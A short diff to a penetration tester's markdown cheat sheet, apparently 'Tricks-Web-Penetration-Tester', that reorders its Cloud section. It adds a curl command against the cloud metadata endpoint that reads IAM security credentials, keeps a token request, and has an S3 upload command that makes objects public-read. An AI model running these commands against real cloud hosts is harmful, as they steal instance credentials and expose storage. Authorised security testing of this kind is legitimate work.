@@ -410,14 +410,14 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
   
 ## Cloud
 
-### Meta-data
-
-`curl http://169.254.169.254/latest/meta-data`
-`curl http://169.254.169.254/latest/api/token`
-
 ### Serverless Injection
 
 `echo "hi" > ok.txt && aws s3 cp ok.txt 's3://<BUCKET>/' -acl -public-read`
+
+### Meta-data
+
+`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`   
+`curl http://169.254.169.254/latest/api/token`
   
 ### Tools
 
